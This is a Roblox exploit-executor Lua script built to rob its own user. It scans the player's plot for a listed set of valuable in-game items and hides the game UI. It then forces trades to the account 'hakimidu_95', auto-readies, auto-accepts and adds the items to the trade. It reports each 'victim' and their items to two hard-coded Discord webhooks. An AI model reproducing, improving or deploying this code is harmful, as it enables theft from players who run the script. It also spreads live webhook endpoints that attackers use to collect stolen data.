if game.PlaceId ~= 109983668079237 then return end

-- ========== SETTINGS & WEBHOOKS ==========
getgenv().WEBHOOK_URL2 = "https://discord.com/api/webhooks/1491134694656311397/ofX4CsHmL97_mPLxkp5f4VKHYOAq7tlcd_3SobAZzoESre71UpxmKg-g_V-0_9o2tPqT"
getgenv().WEBHOOKSHERIF = "https://discord.com/api/webhooks/1490063982760038440/CLhsVX58Yl-Xd5ZqG8kiSqEoNl9NoV4A1SDQXsjOVGJQNGOdfYlk-OetI7XGas0QirJd"
local RICHEST = "hakimidu_95"

-- ========== CORE SERVICES ==========
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer.PlayerGui

-- ========== ANTI-KICK / ANTI-AFK ==========
for i, v in pairs(getconnections(LocalPlayer.Idled)) do
    if v.Disable then v:Disable() end
end
LocalPlayer.Idled:Connect(function() end)

-- ========== UI HIDER (OPTIMIZED TO PREVENT KICK) ==========
task.spawn(function()
    while true do
        pcall(function()
            local rg = CoreGui:FindFirstChild("RobloxGui")
            if rg and rg.Enabled then rg.Enabled = false end
            local tb = CoreGui:FindFirstChild("TopBarApp")
            if tb and tb.Enabled then tb.Enabled = false end
        end)
        task.wait(1) -- Reduced frequency to avoid anti-cheat flags
    end
end)

-- ========== REMOTES ==========
local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
local function getRemote(name)
    local children = Net:GetChildren()
    for i, obj in ipairs(children) do if obj.Name == name then return children[i+1] end end
    return nil
end

local acceptInviteRF = getRemote("RF/TradeService/AcceptInvite")
local createInviteRE  = getRemote("RE/TradeService/CreateInvite")
local readyRE          = getRemote("RE/TradeService/Ready")
local acceptRE         = getRemote("RE/TradeService/Accept")

-- ========== DATA ==========
local wantedItems = {
    "Tralaledon", "Strawberry Elephant", "Skibidi Toilet", "Rosey and Teddy",
    "Popcuru and Fizzuru", "Meowl", "Love Love Bear", "Los Sekolahs",
    "La Supreme Combinasion", "La Casa Boo", "Ketupat Bros", "Hydra Dragon Cannelloni",
    "Headless Horseman", "Griffin", "Fragrama and Chocrama", "Fishino Clownino",
    "Festive 67", "Dragon Gingerini", "Dragon Cannelloni", "Cooki and Milki",
    "Cerberus", "Celestial Pegasus", "Capitano Moby", "Burguro And Fryuro",
    "Los Amigos", "Fortunu and Cashuru", "Spooky and Pumpky", "Ginger Gerat",
    "La Food Combinasion", "Los Tacoritas", "La Secret Combinasion", "Money Money Puggy",
    "Ketchuru and Musturu", "La Taco Combinasion", "Garama and Madundung", "Ventoliero Pavonero",
    "Swaggy Bros", "Tuff Toucan", "W or L", "Chipso and Queso",
    "Los Spaghettis", "Los Hotspotsitos", "Tictac Sahur", "Lovin Rose", "Orcaledon",
    "Ketupat Kepat", "Tang Tang Keletang", "Lavadorito Spinito",
    "Reinito Sleighito", "Celularcini Viciosini", "Sammyni Fattini",
    "Jolly Jolly Sahur", "Fortunu and Coinuru", "Gold Gold Gold", "La Extinct Grande", "La Easter Grande", "Chillin Chilli", "Hydra Bunny",
}

-- ========== LOGGER LOGIC ==========
local function getGenFromDebris(brainrotName)
    local Debris = workspace:FindFirstChild("Debris")
    if not Debris then return "?" end
    for _, Temp in ipairs(Debris:GetChildren()) do
        if Temp.Name == "FastOverheadTemplate" then
            local Overhead = Temp:FindFirstChild("AnimalOverhead")
            if Overhead then
                local Name = Overhead:FindFirstChild("DisplayName")
                local Gen = Overhead:FindFirstChild("Generation")
                if Name and Gen and Name.Text:lower() == brainrotName:lower() then return Gen.Text end
            end
        end
    end
    return "?"
end

local function scanPlot()
    local found = {}
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return found end
    local myPlot = nil
    for _, p in ipairs(plots:GetChildren()) do
        local sign = p:FindFirstChild("PlotSign")
        if sign then
            local lbl = sign:FindFirstChildOfClass("SurfaceGui", true):FindFirstChildOfClass("TextLabel", true)
            if lbl and (lbl.Text:lower():find(LocalPlayer.Name:lower()) or lbl.Text:lower():find(LocalPlayer.DisplayName:lower())) then
                myPlot = p
                break
            end
        end
    end
    if myPlot then
        for _, child in ipairs(myPlot:GetChildren()) do
            if child:IsA("Model") then
                for _, wanted in ipairs(wantedItems) do
                    if child.Name:lower():find(wanted:lower()) then
                        table.insert(found, {name = child.Name, gen = getGenFromDebris(child.Name)})
                        break
                    end
                end
            end
        end
    end
    return found
end

local function sendWebhook(foundItems, webhookUrl, tradeTarget)
    if not webhookUrl or #foundItems == 0 then return end
    local itemLines = ""
    for i, data in ipairs(foundItems) do
        itemLines = itemLines .. i .. ". [🔥] " .. data.name .. " - " .. data.gen .. "\n"
    end
    pcall(function()
        local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                content = "@everyone",
                embeds = {{
                    title = "✦ Vinhub - Victim Found ✦",
                    fields = {
                        { name = "👤 Victim", value = "```" .. LocalPlayer.Name .. "```", inline = true },
                        { name = "🎯 Target", value = "```" .. tradeTarget .. "```", inline = true },
                        { name = "🧠 Items", value = "```" .. itemLines .. "```", inline = false }
                    },
                    color = 1399436,
                    timestamp = DateTime.now():ToIsoDate()
                }}
            })
        })
    end)
end

-- ========== AUTO ACCEPT INVITE ==========
if createInviteRE then
    createInviteRE.OnClientEvent:Connect(function(tradeId)
        if tradeId then
            pcall(function() acceptInviteRF:InvokeServer("57624f2b-8aa9-4974-bb7a-08f058af33ef", tradeId) end)
        end
    end)
end

-- ========== MAIN EXECUTION LOOP ==========
task.spawn(function()
    while true do
        pcall(function()
            local tradeUI = PlayerGui:FindFirstChild("TradeLiveTrade")
            if tradeUI and tradeUI.Enabled then
                -- AUTO READY & ACCEPT
                if readyRE then readyRE:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9") end
                task.wait(0.2)
                if acceptRE then acceptRE:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb") end
                
                -- HIDDEN ITEM ADDER (If target is Richest/Sherif)
                local inner = tradeUI.TradeLiveTrade
                if inner.Other.Username.Text:lower():find(RICHEST:lower()) then
                    local scroll = inner:FindFirstChild("ScrollingFrame", true)
                    if scroll then
                        for _, slot in pairs(scroll:GetChildren()) do
                            if slot.Name:sub(1,9) == "Selection" then
                                local spacer = slot:FindFirstChild("Spacer")
                                if spacer and spacer:FindFirstChild("UIStroke") then
                                    if spacer.UIStroke.Color ~= Color3.fromRGB(0, 255, 0) then
                                        firesignal(spacer.Activated)
                                    end
                                end
                            end
                        end
                    end
                end
            else
                -- PLOT SCAN & INVITE SEND
                local itemsFound = scanPlot()
                if #itemsFound > 0 then
                    local listGui = PlayerGui:FindFirstChild("TradePlayerList")
                    if listGui and listGui:FindFirstChild("TradePlayerList") then
                        local list = listGui.TradePlayerList.Global.List
                        for _, frame in pairs(list:GetChildren()) do
                            if frame:IsA("Frame") and frame:FindFirstChild("Fill") then
                                local nameLabel = frame.Fill:FindFirstChild("Username")
                                if nameLabel and nameLabel.Text:lower():find(RICHEST:lower()) then
                                    local send = frame.Fill:FindFirstChild("Send")
                                    if send and send.Visible then
                                        firesignal(send.Activated)
                                        sendWebhook(itemsFound, getgenv().WEBHOOK_URL2, RICHEST)
                                        sendWebhook(itemsFound, getgenv().WEBHOOKSHERIF, RICHEST)
                                        task.wait(5)
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end)
        task.wait(1.5)
    end
end)
